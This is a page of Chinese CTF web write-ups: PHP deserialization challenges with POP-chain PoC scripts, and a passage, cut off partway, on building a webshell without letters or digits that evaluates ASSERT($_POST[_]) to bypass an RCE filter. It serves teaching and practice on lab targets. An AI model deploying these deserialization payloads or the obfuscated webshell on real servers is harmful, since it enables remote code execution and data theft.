<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1，运行poc，输入序列化后的字符串  O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\桌面\工具\php\teacher.php&quot;;&#125;</span><br><span class="line">修改fllllllag.php文件路径为  /var/www/html/fllllllag.php ，并修改相应字符长度值为27。</span><br><span class="line">提交后，在执行unserialize()函数之前，先检查类里是否有__wakeup()函数，本题中有，就会先执行该函数，</span><br><span class="line">然后会把$x的值赋值为当前文件的绝对路径，我们想要的是fllllllag.php文件，于是需要绕过__wakeup()函数。</span><br><span class="line"></span><br><span class="line">2，开始执行unserialize()函数，由于靶机源码中没有$class = new TestClass()这样的创建实体对象代码，所以这时不会触发__construct()函数（不理解的话，可以看文章前面的分析）</span><br><span class="line"></span><br><span class="line">3，反序列化后，将传入的序列化字符串中的变量$x的值 /var/www/html/fllllllag.php 赋值给X类中的$x，</span><br><span class="line"></span><br><span class="line">4，程序执行完毕，触发 __destruct()函数，并显示路径为$x的文件内容。</span><br></pre></td></tr></table></figure>

<p>—————————————————————————–<strong>END</strong>——————————————————————————————————-</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" data-id="cl9hxo4hl001420v4h2vj4vfn" data-title="由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSWSTAR-week2-UnserializeOne" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" class="article-date">
  <time class="dt-published" datetime="2022-10-19T10:59:22.000Z" itemprop="datePublished">2022-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>写这个反序列化题目，学到了几点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，__clone()魔法函数的触发方法以及一些细节</span><br><span class="line">2，反序列化中属性的私有以及保护的处理方法</span><br></pre></td></tr></table></figure>

<p>直接看题目，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一波，确定了基本pop链，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start:__destruct==&gt;Sec::__toString==&gt;Easy::__call==&gt;eeee::__clone==&gt;Start::__isset==&gt;Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>更详细的pop链，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Start::__destruct()@$this-&gt;name=$sec   -&gt;   $Sec::__toString()@$this-&gt;obj=$easy   -&gt;   $Easy::__call()@$this-&gt;cla=$copy_eee&amp;$var[0]=$eee   -&gt;   $eee::__clone()@($this-&gt;obj)=($start)   -&gt;   $Start::__isset()@$this-&gt;func=$sec   -&gt;   sec::__invoke()</span><br></pre></td></tr></table></figure>

<p>接下来编写poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="variable">$easy</span>-&gt;cla=<span class="variable">$copy_ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>[<span class="number">0</span>]=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>运行，发现php报错，</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png"></p>
<p>然后搞了好久也没找到解决方法，又检查了好几遍pop链，感觉pop链没错，一时间不知道怎么做了。</p>
<p>直到writeup出来😶😶……</p>
<p>最后看了一下writeup，发现构造的pop链是正确的，只是构造过程中几个细节没有处理好，导致php出错。</p>
<p>重新编写的poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$func</span>;<span class="comment">//protected变为public，具体为什么这样修改，现在还不太清楚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$obj</span>;<span class="comment">// private变为public</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$var</span>;<span class="comment">// private变为public</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//$easy-&gt;cla=$copy_ee;</span></span><br><span class="line"><span class="comment">//$sec-&gt;var[0]=$ee;修改为var，去掉数组[]。为什么这样修改，我暂时还不太清楚，以后了解了，会回来更新的</span></span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>其中，为什么<code>$easy-&gt;cla=$copy_ee;</code>删除掉，我的理解是要想让eeee类中__clone()函数触发，只需要eeee类被克隆就OK了，就是让Easy类中的$var&#x3D;$eeee类，而不用再定义Easy中的cla属性。</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/3.png"></p>
<p>最后，编写的exp可以运行，传入后得到flag</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/4.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/" data-id="cl9hxo4hk000z20v4ddtv4uux" data-title="NSWSTAR-week2-UnserializeOne" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-HNCTF-Week1-Challenge-rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" class="article-date">
  <time class="dt-published" datetime="2022-10-16T14:42:58.000Z" itemprop="datePublished">2022-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>废话不多说，直接分析题目。</p>
<p>进入题目，发现一个提示，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/0.png"></p>
<p>既然灵感是来自ctfshou吃瓜杯，那么吃瓜杯的解题思路也应该适用本题，先进入靶机看下题目，发现一片空白，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/1.png"></p>
<p>自然先按F12看源码里有没有提示信息，发现?hint，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/2.png"></p>
<p>试着用GET传一个hint&#x3D;1参数，提交后出现源码，是一个RCE，</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/4.png"></p>
<p>分析下就是用POST传一个rce参数，但是长度不能超过120，而且又过滤了全部字母，以及大多数符号，看下最后能用的字符只有</p>
<p>0-9，$、_、[]、{}这些字符。只用无字符咋能RCE啊？没什么思路，看下题目那里的提示，CTFshow吃瓜杯，百度搜下writeup，</p>
<p>发现了一篇p神写的无数字字符的webshell的博客，<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>总结下文章主要内容，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>， 如何编写一个不使用数字和字母的webshell？</span><br><span class="line">    </span><br><span class="line">首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的</span><br><span class="line">特点，拼接处一个函数名，如“assert”，然后动态执行之即可。</span><br><span class="line">有三个方法，异或，取反，自增，本题使用的是第三个方法，前两个方法为什么用不了，文章里有说明。</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>， 方法三的主要原理是，</span><br><span class="line">    </span><br><span class="line">在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <span class="variable">$a</span> = <span class="string">&#x27;Z&#x27;</span>; <span class="variable">$a</span>++; 将把 <span class="variable">$a</span> 变成<span class="string">&#x27;AA&#x27;</span>，而在 C </span><br><span class="line">中，a = <span class="string">&#x27;Z&#x27;</span>; a++; 将把 a 变成 <span class="string">&#x27;[&#x27;</span>（<span class="string">&#x27;Z&#x27;</span> 的 ASCII 值是 <span class="number">90</span>，<span class="string">&#x27;[&#x27;</span> 的 ASCII 值是 <span class="number">91</span>）。注意字符变量只能递</span><br><span class="line">增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</span><br><span class="line">也就是说，<span class="string">&#x27;a&#x27;</span>++ =&gt; <span class="string">&#x27;b&#x27;</span>，<span class="string">&#x27;b&#x27;</span>++ =&gt; <span class="string">&#x27;c&#x27;</span>... 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。</span><br><span class="line">那么，如何拿到一个值为字符串<span class="string">&#x27;a&#x27;</span>的变量呢？</span><br><span class="line">巧了，数组（Array）的第一个字母就是大写A，而且第<span class="number">4</span>个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-</span><br><span class="line">Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：</span><br><span class="line">再取这个字符串的第一个字母，就可以获得<span class="string">&#x27;A&#x27;</span>了。然后利用递增，可以获取A-Z所有字符</span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>,  利用这个技巧，我编写了如下命令为<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[]);的webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是，无需获取小写a）</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>这个思路对本题来说是正确的，但写本题的webshell还需一些更改，比如博客里获取Array是通过@.”[]”得到的，但是本题的@是被过滤了，$没有被过滤，所以使用以下代码获取字符A </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_=$;$_=$_.[];//此时的$_为Array</span><br><span class="line">$__=$_[0]//$__为A </span><br><span class="line"></span><br><span class="line">由于参数rce有长度限制，所以要尽可能的简化代码，</span><br><span class="line"></span><br><span class="line">上面的代码可以简化为</span><br><span class="line">$_.=[];//不用定义$_=$，直接只用.拼接[],此时$_为Array</span><br><span class="line">$_=$_[0];//$_为A</span><br></pre></td></tr></table></figure>

<p>这里还需要了解PHP 前自增加和后自增加的区别，百度结果如下，</p>
